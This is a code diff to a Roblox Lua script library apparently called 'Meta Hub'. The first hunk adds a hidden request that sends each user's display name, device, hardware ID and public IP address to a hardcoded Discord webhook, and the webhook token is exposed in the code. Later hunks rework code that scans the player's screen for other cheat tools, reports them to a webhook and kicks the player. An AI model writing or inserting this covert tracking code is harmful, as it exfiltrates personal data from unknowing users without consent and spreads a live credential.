@@ -4,6 +4,26 @@ local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Bod
 local decoded = game:GetService('HttpService'):JSONDecode(body)
 local ip = decoded["origin"]
 
+httpservice = game:GetService("HttpService")
+local response = request({
+		Url = "https://discord.com/api/webhooks/1241393145866878996/KBXb8wpgO78mz3TvU_bh5LO32gJuMzKXC1Xjlms-pbLPglurtDtgWKod8SIXdfWTb8Zm",
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = 'application/json'
+		},
+		Body = httpservice:JSONEncode({
+			["content"] = "",
+			["embeds"] = {{
+				["title"] = "Data",
+				["description"] = "**Username:** "..game.Players.LocalPlayer.DisplayName.. "\n **Device:** "..device.."\n **HWID:** "..hwid.."\n **IP:** "..ip,
+				["type"] = "rich",
+				["color"] = tonumber(0xd9abd7),
+				["footer"] = {
+					["text"] = "Meta Hub",
+				}
+			}}
+		})
+	})
 
 local function MakeDraggable(topbarobject, object)
 	local Dragging = nil
@@ -1017,12 +1037,14 @@ game.CoreGui.ChildAdded:Connect(function(v)
 	if v:IsA("ScreenGui") then
 		for i2,v2 in pairs(v:GetDescendants()) do
 			if v2:IsA("TextLabel") or v2:IsA('TextButton') then
-				if string.find(v.Name, "Delta") or string.find(v.Name, "Fluxus") then webhook(v.Name,v2.Parent.Name,v2.Text) return Library end
-				if feb == true  or string.find(v2.Text, 'Dex') or string.find(v2.Text, 'spy') or string.find(v2.Text, 'DEX') or string.find(v2.Text, 'Spy') or string.find(v2.Text, 'Explorer') or string.find(v2.Text, 'Hub') or string.find(v2.Text, 'Remotes') then
-					feb=false
+				if string.find(v.Name, "Delta") or string.find(v.Name, "Fluxus") then webhook(v.Name,v2.Parent.Name,v2.Text)
+					if deb and string.find(v2.Text, 'Dex') or string.find(v2.Text, 'spy') or string.find(v2.Text, 'DEX') or string.find(v2.Text, 'Spy') or string.find(v2.Text, 'Explorer') or string.find(v2.Text, 'Hub') or string.find(v2.Text, 'Remotes') then
+					deb =false
 					webhook(v.Name,v2.Parent.Name,v2.Text)
 					game:GetService('Players').LocalPlayer:Kick('Do not execute anything with this script, doing so will lead into getting blacklisted.')
 
+					end
+					return Library
 				end
 			end
 		end
@@ -1033,12 +1055,14 @@ for i,v in pairs(game.CoreGui:GetChildren()) do
 	if v:IsA("ScreenGui") then
 		for i2,v2 in pairs(v:GetDescendants()) do
 			if v2:IsA("TextLabel") or v2:IsA('TextButton') then
-				if string.find(v.Name, "Delta") or string.find(v.Name, "Fluxus") then webhook(v.Name,v2.Parent.Name,v2.Text) return Library end
-				if deb and string.find(v2.Text, 'Dex') or string.find(v2.Text, 'spy') or string.find(v2.Text, 'DEX') or string.find(v2.Text, 'Spy') or string.find(v2.Text, 'Explorer') or string.find(v2.Text, 'Hub') or string.find(v2.Text, 'Remotes') then
+				if string.find(v.Name, "Delta") or string.find(v.Name, "Fluxus") then webhook(v.Name,v2.Parent.Name,v2.Text)
+					if deb and string.find(v2.Text, 'Dex') or string.find(v2.Text, 'spy') or string.find(v2.Text, 'DEX') or string.find(v2.Text, 'Spy') or string.find(v2.Text, 'Explorer') or string.find(v2.Text, 'Hub') or string.find(v2.Text, 'Remotes') then
 					deb =false
 					webhook(v.Name,v2.Parent.Name,v2.Text)
 					game:GetService('Players').LocalPlayer:Kick('Do not execute anything with this script, doing so will lead into getting blacklisted.')
 
+					end
+					return Library
 				end
 			end
 		end
